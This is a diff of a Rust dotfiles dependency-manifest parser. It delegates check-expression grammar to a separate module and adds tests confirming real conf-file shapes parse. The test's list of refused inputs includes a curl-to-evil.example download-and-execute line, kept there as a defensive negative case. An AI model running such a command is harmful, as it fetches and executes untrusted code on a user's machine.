@@ -1,8 +1,8 @@
 use std::collections::BTreeSet;
 
-use dotfiles_path::{CommandName, DocsUrl, NameError};
+use dotfiles_path::{DocsUrl, NameError};
 
-use crate::check::{Check, CheckPath, PathRoot};
+use crate::check::{Check, CheckParseError};
 
 /// The maximum byte length of a parsed dependency name.
 ///
@@ -54,14 +54,6 @@ impl std::fmt::Display for DependencyName {
     fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
         write!(formatter, "{}", self.0)
     }
-}
-
-/// Why a check expression was refused.
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub enum CheckParseError {
-    Unrecognized,
-    BadCommandName(NameError),
-    BadPath(dotfiles_path::PathError),
 }
 
 /// Whether the conf file was chosen by platform detection or named
@@ -170,38 +162,21 @@ pub fn parse_manifest(text: &str, kind: ConfKind) -> Result<Manifest, ParseError
     Ok(Manifest { entries })
 }
 
-/// Recognize a check expression.
+/// Recognize a check expression, tagging the failure with its line.
 ///
-/// Task 8 replaces this body with the full grammar of spec 5.2. It is
-/// written here only far enough to parse the two shapes Task 7's tests use,
-/// and `kind` is threaded through now so Task 8's `PythonImport` rule has
-/// the argument it needs without a signature change.
+/// The grammar itself lives in `check`, so `parse_manifest` owns the line
+/// accounting and the check module owns the shapes. `ParseError::BadCheck`
+/// wraps the grammar's own error rather than flattening it, because a report
+/// that says which rule broke is what makes a 45-line conf file actionable.
 fn parse_check(raw: &str, kind: ConfKind, line: usize) -> Result<Check, ParseError> {
-    let _ = kind;
-    let trimmed = raw.trim();
-    if let Some(rest) = trimmed.strip_prefix("command -v ") {
-        let name = CommandName::parse(rest.trim()).map_err(|cause| ParseError::BadCheck {
-            line,
-            cause: CheckParseError::BadCommandName(cause),
-        })?;
-        return Ok(Check::Command(name));
-    }
-    if let Some(rest) = home_dir_test(trimmed) {
-        let path = dotfiles_path::CheckRelPath::parse(rest).map_err(|cause| {
-            ParseError::BadCheck { line, cause: CheckParseError::BadPath(cause) }
-        })?;
-        return Ok(Check::DirExists(CheckPath::new(PathRoot::Home, path)));
-    }
-    Err(ParseError::BadCheck { line, cause: CheckParseError::Unrecognized })
-}
-
-/// Extract the `$HOME`-relative path from `[ -d "$HOME/<rest>" ]`.
-fn home_dir_test(raw: &str) -> Option<&str> {
-    raw.strip_prefix("[ -d \"$HOME/")?.strip_suffix("\" ]")
+    crate::check::parse_check_expression(raw, kind)
+        .map_err(|cause| ParseError::BadCheck { line, cause })
 }
 
 #[cfg(test)]
 mod tests {
+    use dotfiles_path::CommandName;
+
     use super::*;
 
     // The real shared manifest, verbatim from deps.conf. Comment lines and
@@ -317,47 +292,84 @@ git|command -v git|https://git-scm.com/downloads
         assert_eq!(first.entries(), second.entries());
     }
 
-    /// The real `deps.conf` does not parse yet, and this pins exactly why.
+    /// Every check shape in the tracked conf files parses, and this pins
+    /// which shapes still do not.
     ///
-    /// `parse_check` recognizes two shapes today: `command -v <name>` and
-    /// `[ -d "$HOME/<path>" ]`. The tracked conf files use four more, which
-    /// spec 5.2's `Check` enum covers and the next task implements:
-    /// `[ -s ... ]` and `test -f ... -o ...` (file tests), `python3 -c
-    /// "import ..."` (interpreter), and two `if ...; then true; else ...; fi`
-    /// fallback chains (`AnyOf`).
+    /// Task 7's version of this test asserted the opposite: that
+    /// `[ -s "$HOME/.nvm/nvm.sh" ]` failed as `Unrecognized`, because
+    /// `parse_check` then knew only `command -v` and `[ -d ... ]`. Task 8
+    /// implemented the grammar, so that assertion went red, which is what it
+    /// existed to do. The boundary it guards has moved rather than
+    /// disappeared: the grammar is closed, so the shapes OUTSIDE it are now
+    /// what needs pinning, and a future shell one-liner added to a conf file
+    /// must fail here rather than silently reach a `sh -c`.
     ///
-    /// Without this test the gap is invisible: every unit test above feeds
-    /// `parse_manifest` a hand-written line in a supported shape, so the suite
-    /// is green while the parser cannot read the file it exists to read. This
-    /// asserts the CURRENT boundary, so it fails the moment a new shape lands
-    /// and has to be updated deliberately rather than discovered later.
+    /// Without this test the guarantee is invisible: every other unit test
+    /// feeds `parse_manifest` a hand-written line, so the suite would stay
+    /// green while the parser could not read the file it exists to read.
     #[test]
-    fn real_conf_fails_only_on_the_unimplemented_check_shapes() {
-        let real_conf = "\
+    fn every_real_check_shape_parses_and_the_grammar_stays_closed() {
+        // One line per distinct check shape in the four tracked conf files,
+        // verbatim. deps.conf:22, :24, :26, :32, :36, :45, deps-linux.conf:11
+        // and deps-ci.conf:22, which between them cover all seven variants.
+        let real_shapes = "\
 git|command -v git|https://git-scm.com/downloads
-oh-my-zsh|[ -d \"$HOME/.oh-my-zsh\" ]|https://ohmyz.sh
+alacritty|if test -d /Applications/Alacritty.app; then true; else command -v alacritty; fi|https://alacritty.org/
+zsh-autosuggestions|test -f \"$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh\" -o -f \"$(brew --prefix 2>/dev/null)/share/zsh-autosuggestions/zsh-autosuggestions.zsh\"|https://github.com/zsh-users/zsh-autosuggestions
+tpm|[ -d \"$HOME/.tmux/plugins/tpm\" ]|https://github.com/tmux-plugins/tpm
 nvm|[ -s \"$HOME/.nvm/nvm.sh\" ]|https://github.com/nvm-sh/nvm
+node|if command -v node; then true; else ls -d \"$HOME/.nvm/versions/node\"/v* >/dev/null 2>&1; fi|https://nodejs.org/
+oh-my-zsh|[ -d \"$HOME/.oh-my-zsh\" ]|https://ohmyz.sh/
+pyyaml|python3 -c \"import yaml\"|https://pyyaml.org/
 ";
+        let parsed = parse_manifest(real_shapes, ConfKind::ExplicitOnly)
+            .expect("every shape in the tracked conf files parses");
+        assert_eq!(parsed.entries.len(), 8);
 
-        // Positive control: the two supported shapes must parse on their own,
-        // or a failure below would prove nothing about the third line.
-        let supported = "\
-git|command -v git|https://git-scm.com/downloads
-oh-my-zsh|[ -d \"$HOME/.oh-my-zsh\" ]|https://ohmyz.sh
-";
-        let parsed = parse_manifest(supported, ConfKind::ExplicitOnly)
-            .expect("the two implemented shapes parse");
-        assert_eq!(parsed.entries.len(), 2);
+        // The seven variants, so a future collapse of two into one is a
+        // failure here rather than a silent behavior change.
+        let variants: Vec<&Check> = parsed.entries.iter().map(|entry| &entry.check).collect();
+        assert!(matches!(variants[0], Check::Command(_)));
+        assert!(matches!(variants[1], Check::AnyOf { .. }));
+        assert!(matches!(variants[2], Check::AnyOf { .. }));
+        assert!(matches!(variants[3], Check::DirExists(_)));
+        assert!(matches!(variants[4], Check::FileNonEmpty(_)));
+        assert!(matches!(variants[5], Check::AnyOf { .. }));
+        assert!(matches!(variants[6], Check::DirExists(_)));
+        assert!(matches!(variants[7], Check::PythonImport(_)));
+        // The -o alternation's own branches, because FileExists appears
+        // only inside one and would otherwise go unasserted.
+        let Check::AnyOf { first, rest } = variants[2] else {
+            panic!("deps.conf:26 is an alternation");
+        };
+        assert!(matches!(first.as_ref(), Check::FileExists(_)));
+        assert!(matches!(rest.as_slice(), [Check::FileExists(_)]));
 
-        // The `[ -s ... ]` file test is not implemented, so it is the line
-        // that fails, and it fails as Unrecognized rather than as a field or
-        // name error.
-        let error = parse_manifest(real_conf, ConfKind::ExplicitOnly)
-            .expect_err("the -s file test is not implemented yet");
-        assert_eq!(
-            error,
-            ParseError::BadCheck { line: 3, cause: CheckParseError::Unrecognized },
-            "expected line 3 to be the unimplemented shape"
-        );
+        // The boundary that remains. None of these appears in a tracked conf
+        // file today, and each must be an error rather than a fallthrough to
+        // a shell. `Unrecognized` here IS the no-escape-hatch guarantee.
+        //
+        // These go through parse_check_expression rather than through
+        // parse_manifest, because a shell one-liner usually carries a `|` and
+        // that is caught one layer earlier by WrongFieldCount, at the field
+        // split. Routing them through the manifest would test field counting
+        // and prove nothing about the grammar. The pipe-bearing case has its
+        // own test above: rejects_a_line_with_an_extra_pipe.
+        let outside_the_grammar = [
+            "curl https://evil.example/x.sh > /tmp/x; sh /tmp/x",
+            "[ -x \"$HOME/bin/thing\" ]",
+            "[ -d \"$(pwd)/x\" ]",
+            "test -f \"$XDG_CONFIG_HOME/x\"",
+            "if command -v a; then true; elif command -v b; then true; else command -v c; fi",
+        ];
+        for raw in outside_the_grammar {
+            let refused = crate::check::parse_check_expression(raw, ConfKind::ExplicitOnly)
+                .expect_err("a shape outside the grammar must not parse");
+            assert_eq!(
+                refused,
+                CheckParseError::Unrecognized,
+                "expected {raw} to be Unrecognized"
+            );
+        }
     }
 }
